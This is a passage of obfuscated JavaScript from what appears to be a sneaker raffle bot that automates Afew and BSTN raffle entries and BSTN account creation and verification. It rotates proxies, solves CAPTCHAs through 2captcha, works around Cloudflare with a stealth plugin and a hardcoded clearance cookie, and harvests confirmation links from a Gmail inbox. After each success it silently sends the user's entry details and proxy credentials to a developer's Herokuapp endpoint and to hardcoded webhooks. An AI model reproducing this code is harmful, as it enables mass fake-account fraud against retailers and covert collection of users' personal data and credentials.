                                    _0x141771 && (_0x1925b6 = _0x141771['size']);
                                } else {
                                    if (_0xf45b0[0x1]['option1']['includes']('Y')) {
                                        const _0x389ffd = _0xa5a512['GS']['find'](_0x4635f8 => _0x4635f8['EUsize'] === _0x1925b6);
                                        _0x389ffd && (_0x1925b6 = _0x389ffd['size']);
                                    } else {
                                        const _0x1b144d = _0xa5a512['men']['find'](_0x40cfae => _0x40cfae['EUsize'] === _0x1925b6);
                                        _0x1b144d && (_0x1925b6 = _0x1b144d['size']);
                                    }
                                }
                                for (var _0x45a5cb of _0xf45b0) {
                                    _0x45a5cb['option1'] == _0x1925b6 && (_0x3d654d = _0x45a5cb['id']);
                                }
                            } else {
                                var _0x46f8db = Math['round'](Math['random']() * (_0xf45b0['length'] - 0x1));
                                _0x3d654d = _0xf45b0[_0x46f8db]['id'];
                            }
                            console['log'](_0x42a46a() + '\x20[' + _0xa8c6d2['name'] + ']\x20Task\x20' + (_0x29cff1 + 0x1) + '\x20:\x20Adding\x20to\x20Cart'), addToCart = await _0x1ea050('https://raffles.afew-store.com/cart/' + _0x3d654d + ':1'), _0x13ed16 = addToCart['request']['res']['responseUrl'];
                        }
                        try {
                            await _0x44dbd9();
                        } catch (_0x343be3) {
                            if (_0x343be3['message']['includes']('TUNN'))
                                throw new Error('Proxy\x20Connection\x20Error');
                            throw new Error('Proxy\x20Error:\x20' + _0x343be3);
                        }
                        const _0x361081 = await _0x192941['newPage']();
                        await _0x361081['setDefaultNavigationTimeout'](0x1d4c0), await _0x361081['authenticate']({
                            'username': '' + _0x10b2a3[0x2],
                            'password': '' + _0x10b2a3[0x3]
                        }), await _0x361081['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x361081['setRequestInterception'](!![]), _0x361081['on']('request', _0x1cfb47 => {
                            _0x1cfb47['resourceType']() === 'image' || _0x1cfb47['resourceType']() === 'font' || _0x1cfb47['resourceType']() === 'media' ? _0x1cfb47['abort']() : _0x1cfb47['continue']();
                        });
                        try {
                            await _0x361081['goto'](_0x13ed16, { 'waituntil': 'networkidle0' });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        console['log'](_0x42a46a() + '\x20[' + _0xa8c6d2['name'] + ']\x20Task\x20' + (_0x29cff1 + 0x1) + '\x20:\x20Submitting\x20Information');
                        try {
                            await _0x361081['waitForSelector']('#checkout_email');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x361081['type']('#checkout_email', '' + _0x38da60[_0x29cff1]['Email']), await _0x488ffe(0x320), await _0x361081['type']('#checkout_attributes_instagram', '' + _0x38da60[_0x29cff1]['Follower']), await _0x488ffe(0x320), await _0x361081['select']('#checkout_shipping_address_country', '' + _0x38da60[_0x29cff1]['Country']), await _0x361081['waitForTimeout'](0x258), await _0x361081['type']('#checkout_shipping_address_first_name', '' + _0x38da60[_0x29cff1]['FirstName']), await _0x361081['waitForTimeout'](0x320), await _0x361081['type']('#checkout_shipping_address_last_name', '' + _0x38da60[_0x29cff1]['LastName']), await _0x361081['waitForTimeout'](0x2bc), await _0x361081['type']('#checkout_shipping_address_address1', _0x38da60[_0x29cff1]['Address1'] + '\x20' + _0x38da60[_0x29cff1]['HouseNumber']), await _0x361081['waitForTimeout'](0x2bc), await _0x361081['type']('#checkout_shipping_address_address2', '' + _0x38da60[_0x29cff1]['Address2']), await _0x361081['waitForTimeout'](0x2bc), await _0x361081['type']('#checkout_shipping_address_zip', '' + _0x38da60[_0x29cff1]['Zip']), await _0x361081['waitForTimeout'](0x2bc), await _0x361081['type']('#checkout_shipping_address_city', '' + _0x38da60[_0x29cff1]['City']), await _0x361081['waitForTimeout'](0x2bc);
                        if (_0x38da60[_0x29cff1]['State'] != '')
                            try {
                                const _0x2742ad = JSON['parse'](_0x7d8dbf['readFileSync']('States.json', 'utf8'));
                                await _0x488ffe(0x1f4);
                                if (_0x38da60[_0x29cff1]['State']['length'] > 0x2)
                                    for (let _0x1e3d49 of _0x2742ad) {
                                        if (_0x1e3d49['Province'] == _0x38da60[_0x29cff1]['State']) {
                                            await _0x361081['select']('#checkout_shipping_address_province', _0x1e3d49['Code']);
                                            break;
                                        }
                                    }
                                else
                                    await _0x361081['select']('#checkout_shipping_address_province', _0x38da60[_0x29cff1]['State']['toUpperCase']());
                            } catch {
                            }
                        await _0x488ffe(0x1f4), console['log'](_0x42a46a() + '\x20[' + _0xa8c6d2['name'] + ']\x20Task\x20' + (_0x29cff1 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x488ffe(0x190), _0x361081['evaluate'](() => {
                            const _0x55f911 = document['querySelector']('#continue_button');
                            for (var _0x4b9854 = 0x0; _0x4b9854 < 0x5; _0x4b9854++) {
                                if (_0x55f911) {
                                    _0x55f911['click'](), _0x55f911['click']();
                                    break;
                                } else
                                    _0x488ffe(0xfa0);
                            }
                        }), await _0x361081['waitForTimeout'](0x9c4);
                        try {
                            await _0x361081['waitForSelector']('form[data-shipping-method-form=\x22true\x22]'), await _0x361081['$eval']('form[data-shipping-method-form=\x22true\x22]', _0x4f3b2c => _0x4f3b2c['submit']());
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x361081['waitForTimeout'](0x7d0), console['log'](_0x42a46a() + '\x20[' + _0xa8c6d2['name'] + ']\x20Task\x20' + (_0x29cff1 + 0x1) + '\x20:\x20Finishing\x20Entry');
                        try {
                            await _0x361081['waitForSelector']('div[data-payment-subform=\x22required\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x488ffe(0x3e8), await _0x361081['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20div\x20>\x20form', _0x5cc091 => _0x5cc091['submit']()), await _0x488ffe(0x3e8);
                        try {
                            await _0x361081['waitForSelector']('div[data-last-step=\x22true\x22]', { 'timeout': 0x186a0 });
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x361081['$eval']('body\x20>\x20div.content\x20>\x20div\x20>\x20div\x20>\x20main\x20>\x20div.step\x20>\x20form', _0x4dd09e => _0x4dd09e['submit']());
                        try {
                            await _0x361081['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x45e808 = 'no', _0xb5b21(_0x38da60[_0x29cff1], _0xa8c6d2), console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0xa8c6d2['name'] + ']\x20Task\x20' + (_0x29cff1 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '')
                                try {
                                    await _0x49f827(_0x5450ed['webhook'], _0x2ab139['succesDEVMSG']);
                                } catch {
                                }
                            await _0x488ffe(0xc8), await _0x49f827(_0xf35405, _0x2ab139['succesDEVMSG']), await _0x488ffe(0xc8);
                            try {
                                await _0x49f827(_0x1bf959, _0x2ab139['succesPUBMSG']);
                            } catch {
                            }
                            try {
                                prxdata = {
                                    'username': _0x15d59c['replace']('#', ''),
                                    'module': _0xa8c6d2['name'],
                                    'entrydata': JSON['stringify'](_0x5c5bcf),
                                    'proxy': '' + _0x2252ac[_0x29cff1]
                                };
                                var _0x498cd9 = JSON['stringify'](prxdata);
                                let _0x541b4b = { 'headers': { 'content-type': 'application/json' } };
                                await _0x1ea050['post']('https://jraffles.herokuapp.com/success', _0x498cd9, _0x541b4b);
                            } catch (_0x5f0ff4) {
                            }
                        } catch (_0x47d731) {
                            throw new Error('Connection\x20Error\x20Fetching\x20Response');
                        }
                    } catch (_0x539a66) {
                        _0x539a66['message']['includes']('selector') && (_0x539a66 = 'Connection\x20Error');
                        console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0xa8c6d2['name'] + ']\x20Task\x20' + (_0x29cff1 + 0x1) + '\x20:\x20' + _0x539a66)), _0x58a239 = '' + _0x539a66;
                        var _0x4e79d3 = await _0x5605d8(_0x38da60[_0x29cff1], _0xa8c6d2, 'dev', !![], _0x58a239);
                        _0x2ab139['errorDEV'] = { 'embeds': [_0x4e79d3] }, _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x2ab139['errorDEV']), await _0x49f827(_0x47580b, _0x2ab139['errorDEV']), _0x45e808 = 'yes';
                    } finally {
                        _0x192941 && _0x192941['close']();
                        if (_0x45e808 == 'yes' && _0x3a8d46 != 0x5 && _0x58a239 != 'Size\x20Not\x20Found') {
                            console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0xa8c6d2['name'] + ']\x20Task\x20' + (_0x29cff1 + 0x1) + '\x20:\x20Retrying\x20(' + _0x3a8d46 + '\x20/\x205)')), _0x29cff1 = _0x29cff1 - 0x1, _0x3a8d46 = _0x3a8d46 + 0x1;
                            continue;
                        }
                        _0x45e808 == 'yes' && _0x3a8d46 >= 0x5 && (_0x2e6413(_0x38da60[_0x29cff1], _0xa8c6d2), _0x45e808 = 'no', _0x3a8d46 = 0x0);
                        if (_0x29cff1 + 0x1 == _0x38da60['length']) {
                            await _0x488ffe(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x5450ed['AfewDelay'] + '\x20ms'), await _0x488ffe(_0x5450ed['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x214810, _0x5dc2b1, _0x52ec22) {
                    _0x4ab5bb['use'](_0x44f368()), _0x4ab5bb['use'](_0x45c327({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5450ed['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x45c3d5 = 0x0; _0x45c3d5 < _0x5dc2b1['length']; _0x45c3d5++) {
                        if (_0x5507d4 != 'yes')
                            var _0x5507d4 = '', _0x1054e2 = 0x0;
                        var _0x25e2e0;
                        try {
                            await _0x3215be(_0x5dc2b1, _0x45c3d5);
                        } catch {
                            _0x5507d4 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x55ca22(_0x214810['name'] + '\x20Task\x20' + (_0x45c3d5 + 0x1) + '\x20/\x20' + _0x5dc2b1['length'] + '\x20||\x20File:\x20' + _0x121079 + '\x20Proxies:\x20' + _0x590947);
                        var _0x5a3730 = await _0x5605d8(_0x5dc2b1[_0x45c3d5], _0x214810, 'acc', ![]);
                        const _0x2a121d = { 'succesDEVMSG': { 'embeds': [_0x5a3730] } }, _0x4cd603 = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x2f27f7 = Math['round'](Math['random']() * (_0x52ec22['length'] - 0x1)), _0x2d6b16 = _0x52ec22[_0x2f27f7]['split'](':'), _0xb578ba;
                        try {
                            _0xb578ba = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2d6b16[0x0] + ':' + _0x2d6b16[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0xb578ba = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2d6b16[0x0] + ':' + _0x2d6b16[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x388b68 = await _0xb578ba['newPage']();
                            await _0x388b68['authenticate']({
                                'username': '' + _0x2d6b16[0x2],
                                'password': '' + _0x2d6b16[0x3]
                            }), console['log'](_0x42a46a() + '\x20[' + _0x214810['name'] + ']\x20Task\x20' + (_0x45c3d5 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x388b68['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x388b68['setRequestInterception'](!![]), _0x388b68['on']('request', _0x43bac8 => {
                                _0x43bac8['resourceType']() === 'image' ? _0x43bac8['abort']() : _0x43bac8['continue']();
                            });
                            try {
                                await _0x388b68['goto']('' + _0x4cd603), await _0x388b68['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x5507d4 = 'yes';
                                throw new Error('Proxy\x20Error');
                            }
                            await _0x388b68['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x42a46a() + '\x20[' + _0x214810['name'] + ']\x20Task\x20' + (_0x45c3d5 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x488ffe(0x7d0), console['log'](_0x42a46a() + '\x20[' + _0x214810['name'] + ']\x20Task\x20' + (_0x45c3d5 + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x488ffe(0x190), await _0x388b68['waitForSelector']('#firstname'), await _0x388b68['type']('#firstname', _0x5dc2b1[_0x45c3d5]['FirstName'], { 'delay': 0xf0 }), await _0x488ffe(0x190), await _0x388b68['type']('#lastname', _0x5dc2b1[_0x45c3d5]['LastName'], { 'delay': 0xe6 }), await _0x488ffe(0x190), await _0x388b68['type']('#email_address', _0x5dc2b1[_0x45c3d5]['Email'], { 'delay': 0x122 }), await _0x488ffe(0x190), await _0x388b68['type']('#password', _0x5dc2b1[_0x45c3d5]['Password'], { 'delay': 0x82 }), await _0x488ffe(0x1f4), await _0x388b68['type']('#password-confirmation', _0x5dc2b1[_0x45c3d5]['Password'], { 'delay': 0x7c }), console['log'](_0x42a46a() + '\x20[' + _0x214810['name'] + ']\x20Task\x20' + (_0x45c3d5 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x488ffe(0x2bc), await _0x388b68['$eval']('#form-validate', _0x4fd3ed => _0x4fd3ed['submit']()), await _0x488ffe(0x1388);
                            const _0x557474 = await _0x388b68['$']('#email_address-error');
                            if (_0x557474)
                                throw new Error('Invalid\x20Email');
                            const _0xd0ac38 = await _0x388b68['$']('#password-error');
                            if (_0xd0ac38)
                                throw new Error('Invalid\x20Password');
                            await _0x388b68['waitForSelector']('div.mesg-success'), _0x5507d4 = 'no', console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0x214810['name'] + ']\x20Task\x20' + (_0x45c3d5 + 0x1) + '\x20:\x20Account\x20' + _0x5dc2b1[_0x45c3d5]['Email'] + '\x20Generated')), _0x7d8dbf['appendFileSync']('../accounts/bstn.csv', '\x0a' + _0x5dc2b1[_0x45c3d5]['Email'] + ',' + _0x5dc2b1[_0x45c3d5]['Password']);
                            try {
                                _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x2a121d['succesDEVMSG']);
                            } catch {
                            }
                            await _0x49f827(_0x2b5f53, _0x2a121d['succesDEVMSG']);
                            let _0x2440b2 = _0x5dc2b1[_0x45c3d5];
                            try {
                                prxdata = {
                                    'username': _0x15d59c['replace']('#', ''),
                                    'module': _0x214810['name'],
                                    'entrydata': JSON['stringify'](_0x2440b2),
                                    'proxy': '' + _0x52ec22[_0x45c3d5]
                                };
                                var _0x1db28e = JSON['stringify'](prxdata);
                                let _0xd51166 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x1ea050['post']('https://jraffles.herokuapp.com/success', _0x1db28e, _0xd51166);
                            } catch (_0x1fe193) {
                            }
                            console['log'](_0x387ef2['yellow'](_0x42a46a() + '\x20[' + _0x214810['name'] + ']\x20Task\x20' + (_0x45c3d5 + 0x1) + '\x20:\x20After\x20your\x20all\x20tasks\x20are\x20finished,\x20run\x20\x27BSTN\x20Account\x20Verifier\x27'));
                        } catch (_0x5e99e1) {
                            console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x214810['name'] + ']\x20Task\x20' + (_0x45c3d5 + 0x1) + '\x20:\x20' + _0x5e99e1)), _0x25e2e0 = '' + _0x5e99e1;
                            var _0x180d77 = await _0x5605d8(_0x5dc2b1[_0x45c3d5], _0x214810, 'acc', !![], _0x25e2e0);
                            _0x2a121d['errorDEV'] = { 'embeds': [_0x180d77] }, _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x2a121d['errorDEV']), await _0x49f827(_0x47580b, _0x2a121d['errorDEV']), _0x5507d4 = 'yes';
                        } finally {
                            if (_0xb578ba)
                                _0xb578ba['close']();
                            if (_0x5507d4 == 'yes' && _0x1054e2 != 0x5) {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x214810['name'] + ']\x20Task\x20' + (_0x45c3d5 + 0x1) + '\x20:\x20Retrying\x20(' + _0x1054e2 + '\x20/\x205)')), _0x45c3d5 = _0x45c3d5 - 0x1, _0x1054e2 = _0x1054e2 + 0x1;
                                continue;
                            }
                            _0x5507d4 == 'yes' && _0x1054e2 >= 0x5 && (_0x2e6413(_0x5dc2b1[_0x45c3d5], _0x214810), _0x5507d4 = 'no', _0x1054e2 = 0x0), console['log'](_0x42a46a() + '\x20[' + _0x214810['name'] + ']\x20Waiting\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Account\x20Verifier',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x311db1, _0x2571c5) {
                    var _0x57b0de = ![], _0x19c7f1 = [];
                    async function _0x3c6df3() {
                        var _0x14da06 = new _0x3dffcd({
                            'user': _0x5450ed['masterMail'],
                            'password': _0x5450ed['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x46614a(_0x1363be) {
                            _0x14da06['openBox']('INBOX', ![], _0x1363be);
                        }
                        _0x14da06['once']('ready', function () {
                            _0x46614a(function (_0xdeb74d, _0xbbefbf) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0xdeb74d)
                                    throw _0xdeb74d;
                                _0x14da06['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Please\x20confirm\x20your\x20BSTN\x20Store\x20account'
                                    ]
                                ], function (_0x31ddaa, _0x594e8a) {
                                    if (!_0x594e8a || !_0x594e8a['length'])
                                        console['log'](_0x42a46a() + '\x20[' + _0x311db1['name'] + ']\x20No\x20mails\x20found'), _0x14da06['end']();
                                    else {
                                        var _0x1aff95 = _0x14da06['seq']['fetch'](_0x594e8a, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x1aff95['on']('message', function (_0x25192f, _0x5e058c) {
                                            var _0x181020 = '(#' + _0x5e058c + ')\x20';
                                            _0x25192f['on']('body', function (_0x4b79e, _0x73de75) {
                                                _0x255d24(_0x4b79e, (_0x1dc8d6, _0x5ebdda) => {
                                                    var _0x567329 = _0x5ebdda['text']['split']('[')[0x2], _0x4d218b = _0x567329['split'](']')[0x0];
                                                    _0x19c7f1['push'](_0x4d218b);
                                                });
                                            }), _0x25192f['once']('end', function () {
                                            });
                                        }), _0x1aff95['once']('error', function (_0x5078a6) {
                                            console['log']('Fetch\x20error:\x20' + _0x5078a6), _0x57b0de = !![];
                                        }), _0x1aff95['once']('end', function () {
                                            _0x14da06['end'](), _0x57b0de = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x14da06['once']('error', function (_0x399f4b) {
                            console['log'](_0x387ef2['red'](_0x399f4b['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x57b0de = !![];
                        }), _0x14da06['once']('end', async function () {
                            _0x57b0de = !![];
                        }), _0x14da06['connect']();
                    }
                    async function _0x347ae6(_0x47fd11, _0x42069c, _0x59ad20) {
                        _0x4ab5bb['use'](_0x44f368());
                        for (var _0x5ad7fc = 0x0; _0x5ad7fc < _0x42069c['length']; _0x5ad7fc++) {
                            if (_0x5a9f13 != 'yes')
                                var _0x5a9f13 = '', _0x5d7cb1 = 0x0;
                            var _0x1ae536 = Math['round'](Math['random']() * (_0x59ad20['length'] - 0x1)), _0x55e64a = _0x59ad20[_0x1ae536]['split'](':'), _0xca33fe;
                            try {
                                _0xca33fe = await _0x4ab5bb['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x55e64a[0x0] + ':' + _0x55e64a[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0xca33fe = await _0x4ab5bb['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x55e64a[0x0] + ':' + _0x55e64a[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                const _0x32c30b = await _0xca33fe['newPage']();
                                await _0x32c30b['authenticate']({
                                    'username': '' + _0x55e64a[0x2],
                                    'password': '' + _0x55e64a[0x3]
                                }), console['log'](_0x42a46a() + '\x20[' + _0x47fd11['name'] + ']\x20Task\x20' + (_0x5ad7fc + 0x1) + '\x20:\x20Starting\x20Verification'), await _0x32c30b['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x32c30b['setRequestInterception'](!![]), _0x32c30b['on']('request', _0x27451c => {
                                    _0x27451c['resourceType']() === 'image' || _0x27451c['resourceType']() === 'font' || _0x27451c['resourceType']() === 'media' ? _0x27451c['abort']() : _0x27451c['continue']();
                                }), console['log'](_0x42a46a() + '\x20[' + _0x47fd11['name'] + ']\x20Task\x20' + (_0x5ad7fc + 0x1) + '\x20:\x20Getting\x20Session');
                                try {
                                    await _0x32c30b['goto'](_0x42069c[_0x5ad7fc]);
                                } catch {
                                    _0x5a9f13 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                console['log'](_0x42a46a() + '\x20[' + _0x47fd11['name'] + ']\x20Task\x20' + (_0x5ad7fc + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x32c30b['waitForTimeout'](0xbb8);
                                try {
                                    await _0x32c30b['waitForSelector']('.account-nav'), _0x5a9f13 = 'no', console['log'](_0x387ef2['green'](_0x42a46a() + '\x20[' + _0x47fd11['name'] + ']\x20Task\x20' + (_0x5ad7fc + 0x1) + '\x20:\x20Verification\x20Successful'));
                                    var _0x1d0daf = await _0x5605d8(null, _0x47fd11, 'ver', ![]);
                                    const _0xbf2f0f = { 'succesDEVMSG': { 'embeds': [_0x1d0daf] } };
                                    await _0x49f827(_0x2042d9, _0xbf2f0f['succesDEVMSG']);
                                } catch {
                                    _0x5a9f13 = 'no';
                                    throw new Error('Link\x20Already\x20Verified,\x20skipping..');
                                }
                            } catch (_0x5aa811) {
                                console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x47fd11['name'] + ']\x20Task\x20' + (_0x5ad7fc + 0x1) + '\x20:\x20' + _0x5aa811));
                                var _0x4ebb58 = _0x5aa811, _0x41d66a = await _0x5605d8(null, _0x47fd11, 'ver', !![], _0x4ebb58);
                                const _0x52578d = { 'errorDEVMSG': { 'embeds': [_0x41d66a] } };
                                _0x5450ed['webhook'] != undefined && _0x5450ed['webhook'] != '' && await _0x49f827(_0x5450ed['webhook'], _0x52578d['errorDEVMSG']), await _0x49f827(_0x47580b, _0x52578d['errorDEVMSG']);
                            } finally {
                                _0xca33fe['close']();
                                if (_0x5a9f13 == 'yes' && _0x5d7cb1 != 0x5) {
                                    console['log'](_0x387ef2['red'](_0x42a46a() + '\x20[' + _0x47fd11['name'] + ']\x20Task\x20' + (_0x5ad7fc + 0x1) + '\x20:\x20Retrying\x20(' + _0x5d7cb1 + '\x20/\x205)')), _0x5ad7fc = _0x5ad7fc - 0x1, _0x5d7cb1 = _0x5d7cb1 + 0x1;
                                    continue;
                                }
                                _0x5a9f13 == 'yes' && _0x5d7cb1 >= 0x5 && (_0x5a9f13 = 'no', _0x5d7cb1 = 0x0), console['log'](_0x42a46a() + '\x20[' + _0x47fd11['name'] + ']\x20Waiting\x20for\x20' + _0x5450ed['delay'] + '\x20ms'), await _0x488ffe(_0x5450ed['delay']);
                            }
                        }
                    }
                    try {
                        _0x3c6df3();
                        while (!_0x57b0de) {
                            await _0x488ffe(0xfa0);
                        }
                        console['log']('Found\x20' + _0x19c7f1['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x488ffe(0x7d0);
                    }
                    await _0x347ae6(_0x311db1, _0x19c7f1, _0x2571c5);
                }
            },
            {
                'name': 'BSTN\x20Raffle\x20Entries',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x98f5cd, _0x4246a3, _0x29c160) {
                    _0x4ab5bb['use'](_0x44f368()), _0x4ab5bb['use'](_0x45c327({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5450ed['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x306531 = 0x0; _0x306531 < _0x4246a3['length']; _0x306531++) {
                        var _0x411f24, _0x20ac54 = _0x4246a3[_0x306531];
                        try {
                            await _0x3215be(_0x4246a3, _0x306531);
                        } catch {
                            _0x1615ac = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        async function _0x1ad438(_0x2ac2ef) {
                            const _0x3039ab = _0x7d8dbf['readFileSync']('../successful-tasks.csv', 'utf8'), _0x96799e = _0x16e760['parse'](_0x3039ab, { 'header': !![] })['data'];
                            let _0x28117c = ![];
                            for (var _0x31b448 of _0x96799e) {
                                if (_0x31b448['Url'] == _0x2ac2ef['Url'] && _0x31b448['Email'] == _0x2ac2ef['Email']) {
                                    _0x28117c = !![];
                                    break;
                                }
                            }
                            return _0x28117c;
                        }
                        if (await _0x1ad438(_0x4246a3[_0x306531]) == !![]) {
                            console['log'](_0x42a46a() + '\x20[' + _0x98f5cd['name'] + ']\x20Task\x20' + (_0x306531 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                            continue;
                        }
                        if (_0x1615ac != 'yes')
                            var _0x1615ac = '', _0x48c5c4 = 0x0;
                        _0x55ca22(_0x98f5cd['name'] + '\x20Task\x20' + (_0x306531 + 0x1) + '\x20/\x20' + _0x4246a3['length'] + '\x20||\x20File:\x20' + _0x121079 + '\x20Proxies:\x20' + _0x590947);
                        var _0x12b17f = Math['round'](Math['random']() * (_0x29c160['length'] - 0x1)), _0x2e6334 = _0x29c160[_0x12b17f]['split'](':'), _0x22579c;
                        try {
                            _0x22579c = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x2e6334[0x0] + ':' + _0x2e6334[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x22579c = await _0x4ab5bb['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x2e6334[0x0] + ':' + _0x2e6334[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2c55f2 = await _0x22579c['newPage'](), _0x42c72a = await _0x2c55f2['target']()['createCDPSession'](), { windowId: _0x300568 } = await _0x42c72a['send']('Browser.getWindowForTarget');
                            await _0x2c55f2['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x23ae9e = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x2c55f2['authenticate']({
                                'username': '' + _0x2e6334[0x2],
                                'password': '' + _0x2e6334[0x3]
                            }), console['log'](_0x42a46a() + '\x20[' + _0x98f5cd['name'] + ']\x20Task\x20' + (_0x306531 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2c55f2['goto']('' + _0x4246a3[_0x306531]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x42a46a() + '\x20[' + _0x98f5cd['name'] + ']\x20Task\x20' + (_0x306531 + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            try {
                                await _0x2c55f2['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                            } catch {
                                throw new Error('Blocked\x20by\x20Cloudflare');
                            }
